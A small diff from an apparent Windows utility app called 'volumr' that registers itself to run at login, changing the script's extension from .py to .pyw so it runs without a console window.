@@ -6,7 +6,7 @@ PATH_AUTORUN = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 KEY_AUTORUN = winreg.CreateKey(winreg.HKEY_CURRENT_USER, PATH_AUTORUN)
 APP_NAME = "volumr"
 HOME_DIR = ip_retriever.HOME_DIR
-PATH_FILE = HOME_DIR + "\\" + APP_NAME + ".py"
+PATH_FILE = HOME_DIR + "\\" + APP_NAME + ".pyw"
 
 def deleteFromAutorun():
     try:
